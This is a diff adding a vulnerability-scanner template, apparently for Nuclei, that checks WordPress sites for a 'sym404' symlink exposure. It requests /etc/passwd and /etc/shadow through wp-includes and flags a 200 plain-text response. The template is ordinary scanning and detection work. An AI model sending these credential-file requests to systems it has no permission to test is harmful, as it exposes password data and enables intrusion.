@@ -1,0 +1,32 @@
+id: wp-passwd
+
+info:
+  name: password exposure
+  author: @_yashgoti
+  severity: Medium
+  tags: wordpress,wp,passwd
+  reference: https://twitter.com/momika233/status/1540325055280070656/photo/1
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-includes/sym404/root/etc/passwd"
+      - "{{BaseURL}}/wp-includes/sym404/root/etc/shadow"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '*:*'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: status
+        status:
+          - 200
